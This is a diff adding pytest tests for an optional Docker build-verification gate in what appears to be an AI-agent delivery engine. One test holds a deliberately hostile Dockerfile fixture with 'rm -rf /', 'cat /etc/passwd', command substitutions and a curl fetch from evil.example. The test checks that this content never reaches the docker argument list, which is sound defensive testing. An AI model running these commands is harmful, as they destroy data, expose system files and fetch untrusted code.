@@ -4046,6 +4046,278 @@ def test_devops_ci_workflow_file_is_kept_when_opted_in():
     assert ".github/workflows/ci.yml" in outcome.workspace_files
 
 
+def _devops_response_with_dockerfile(path="Dockerfile", content="FROM python:3.12-slim\n"):
+    return json_response(
+        {
+            "environment": "production",
+            "summary": "containerised",
+            "steps": ["build image"],
+            "rollback": ["previous tag"],
+            "files": [
+                {
+                    "path": path,
+                    "change_type": "create",
+                    "summary": "app image",
+                    "content": content,
+                }
+            ],
+        }
+    )
+
+
+def test_docker_build_gate_off_by_default_no_docker_invoked():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(runner, workspace=ws, command_runner=cmd)
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert ws.read_text("Dockerfile").startswith("FROM python")
+    assert not any(c and c[0] == "docker" for c in cmd.calls)
+    assert "docker_build_verified" not in outcome.scorecard
+
+
+def test_docker_build_gate_no_dockerfile_no_docker_invoked():
+    cmd = GateCycleRunner()
+    runner = ScriptedRunner(by_system_prompt=engine_responses())
+    engine = _engine(runner, command_runner=cmd, config=EngineConfig(docker_build_gate=True))
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert not any(c and c[0] == "docker" for c in cmd.calls)
+    assert "docker_build_verified" not in outcome.scorecard
+
+
+def test_docker_build_gate_root_dockerfile_success_records_scorecard_and_cleans_up():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    events = []
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner,
+        workspace=ws,
+        command_runner=cmd,
+        listener=events.append,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert outcome.scorecard["docker_build_verified"] is True
+    assert "docker_build_detail" not in outcome.scorecard
+    build_calls = [c for c in cmd.calls if c[:2] == ["docker", "build"]]
+    rmi_calls = [c for c in cmd.calls if c[:2] == ["docker", "rmi"]]
+    assert len(build_calls) == 1
+    assert len(rmi_calls) == 1
+    build_tag = build_calls[0][3]
+    assert rmi_calls[0] == ["docker", "rmi", build_tag]
+    verified_events = [e for e in events if e.stage == "docker-build-verified"]
+    assert len(verified_events) == 1
+
+
+def test_docker_build_gate_failure_is_advisory_only_and_still_cleans_up():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    cmd.add_rule("docker build", CommandResult(["docker", "build"], 1, "step 3/5 failed", ""))
+    events = []
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner,
+        workspace=ws,
+        command_runner=cmd,
+        listener=events.append,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    outcome = run(engine.deliver(_request()))
+
+    # advisory only: the run still succeeds and the artifacts stay applied
+    assert outcome.success is True
+    assert outcome.scorecard["docker_build_verified"] is False
+    assert "step 3/5 failed" in outcome.scorecard["docker_build_detail"]
+    assert ws.read_text("Dockerfile").startswith("FROM python")
+    rmi_calls = [c for c in cmd.calls if c[:2] == ["docker", "rmi"]]
+    assert len(rmi_calls) == 1
+    failed_events = [e for e in events if e.stage == "docker-build-failed"]
+    assert len(failed_events) == 1
+
+
+def test_docker_build_gate_cleanup_failure_is_swallowed_and_logged():
+    class _RmiRaisingRunner(GateCycleRunner):
+        def run(self, command, *, cwd=None, timeout=None):
+            args = list(command)
+            if args[:2] == ["docker", "rmi"]:
+                self.calls.append(args)
+                raise RuntimeError("rmi exploded")
+            return super().run(command, cwd=cwd, timeout=timeout)
+
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    ws = InMemoryWorkspace()
+    cmd = _RmiRaisingRunner()
+    events = []
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner,
+        workspace=ws,
+        command_runner=cmd,
+        listener=events.append,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    outcome = run(engine.deliver(_request()))
+
+    # the run never fails on account of a cleanup that itself blew up
+    assert outcome.success is True
+    assert outcome.scorecard["docker_build_verified"] is True
+    cleanup_events = [e for e in events if e.stage == "docker-build-cleanup-failed"]
+    assert len(cleanup_events) == 1
+    assert "rmi exploded" in cleanup_events[0].message
+
+
+def test_docker_build_gate_cleanup_nonzero_exit_is_swallowed_and_logged():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    cmd.add_rule("docker rmi", CommandResult(["docker", "rmi"], 1, "image in use", ""))
+    events = []
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner,
+        workspace=ws,
+        command_runner=cmd,
+        listener=events.append,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    outcome = run(engine.deliver(_request()))
+
+    # a cleanup that fails (without raising) is also swallowed and logged
+    assert outcome.success is True
+    assert outcome.scorecard["docker_build_verified"] is True
+    cleanup_events = [e for e in events if e.stage == "docker-build-cleanup-failed"]
+    assert len(cleanup_events) == 1
+    assert "image in use" in cleanup_events[0].detail
+
+
+def test_docker_build_gate_detects_first_level_nested_dockerfile():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile(path="deploy/Dockerfile")
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner, workspace=ws, command_runner=cmd, config=EngineConfig(docker_build_gate=True)
+    )
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert outcome.scorecard["docker_build_verified"] is True
+    assert any(c[:2] == ["docker", "build"] for c in cmd.calls)
+
+
+def test_docker_build_gate_ignores_deeper_nested_dockerfile():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile(
+        path="infra/prod/Dockerfile"
+    )
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner, workspace=ws, command_runner=cmd, config=EngineConfig(docker_build_gate=True)
+    )
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert not any(c and c[0] == "docker" for c in cmd.calls)
+    assert "docker_build_verified" not in outcome.scorecard
+
+
+def test_docker_build_gate_tags_are_unique_per_engine_run():
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile()
+    cmd_a = GateCycleRunner()
+    cmd_b = GateCycleRunner()
+    engine_a = _engine(
+        ScriptedRunner(by_system_prompt=responses),
+        workspace=InMemoryWorkspace(),
+        command_runner=cmd_a,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    engine_b = _engine(
+        ScriptedRunner(by_system_prompt=responses),
+        workspace=InMemoryWorkspace(),
+        command_runner=cmd_b,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    run(engine_a.deliver(_request()))
+    run(engine_b.deliver(_request()))
+
+    tag_a = next(c[3] for c in cmd_a.calls if c[:2] == ["docker", "build"])
+    tag_b = next(c[3] for c in cmd_b.calls if c[:2] == ["docker", "build"])
+    assert tag_a != tag_b
+
+
+def test_docker_build_gate_independent_of_ci_workflow_filter():
+    # A file the allow_ci_workflows filter drops is irrelevant to this gate:
+    # it reads the post-apply workspace listing, not the pre-filter artifact
+    # set, so the Dockerfile is still detected and built even though the CI
+    # workflow file in the same DevOps response never reaches disk.
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_workflow_file()
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    events = []
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner,
+        workspace=ws,
+        command_runner=cmd,
+        listener=events.append,
+        config=EngineConfig(docker_build_gate=True),
+    )
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    assert not ws.exists(".github/workflows/ci.yml")
+    assert ws.read_text("Dockerfile").startswith("FROM python")
+    assert outcome.scorecard["docker_build_verified"] is True
+    blocked = [e for e in events if e.stage == "deployment-artifacts-blocked"]
+    assert len(blocked) == 1
+    assert "Dockerfile" not in blocked[0].detail
+
+
+def test_docker_build_gate_dockerfile_content_never_reaches_argv():
+    malicious_content = (
+        "FROM python:3.12-slim\n"
+        "RUN echo $(rm -rf /) `whoami` ; cat /etc/passwd\n"
+        'LABEL note="`id`"\n'
+        "ARG X=$(curl evil.example/x)\n"
+    )
+    responses = engine_responses()
+    responses["DevOps engineer"] = _devops_response_with_dockerfile(content=malicious_content)
+    ws = InMemoryWorkspace()
+    cmd = GateCycleRunner()
+    runner = ScriptedRunner(by_system_prompt=responses)
+    engine = _engine(
+        runner, workspace=ws, command_runner=cmd, config=EngineConfig(docker_build_gate=True)
+    )
+    outcome = run(engine.deliver(_request()))
+
+    assert outcome.success is True
+    build_calls = [c for c in cmd.calls if c[:2] == ["docker", "build"]]
+    assert len(build_calls) == 1
+    tag = build_calls[0][3]
+    assert build_calls[0] == ["docker", "build", "-t", tag, "."]
+    assert "rm -rf" not in tag and "whoami" not in tag and "curl" not in tag
+
+
 def test_writer_docs_are_written_to_workspace():
     responses = engine_responses()
     responses["technical writer"] = json_response(
